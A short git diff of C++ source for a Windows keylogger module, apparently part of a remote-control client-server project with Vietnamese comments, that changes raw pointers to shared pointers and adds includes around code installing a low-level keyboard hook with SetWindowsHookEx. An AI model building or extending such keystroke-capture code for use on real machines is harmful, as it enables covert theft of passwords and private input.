@@ -1,4 +1,6 @@
 #include "KLG_Func.h"
+#include "utils.h"
+#include "DataObj/DataObj.h"
 
 LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -19,10 +21,10 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-DataObj* KLG_Func::keylogger()
+std::shared_ptr<DataObj> KLG_Func::keylogger()
 {
     std::string res = "";
-    DataObj* MES = new KLG_Obj(DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res);
+	std::shared_ptr<DataObj> MES(new DataObj(utils::CurrentTime(), DataType::RESPONSE, FuncType::KLG, CmdType::DATA, res));
 
 	// Thiết lập hook để bắt sự kiện phím
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
@@ -69,7 +71,7 @@ DataObj* KLG_Func::keylogger()
 
 bool KLG_Func::checkStopSignal()
 {
-	DataObj* stopSignal;
+	std::shared_ptr<DataObj> stopSignal;
 
 	// thao tác nhận tín hiệu từ client là đối tượng DataObj stopSignal
 	// ...
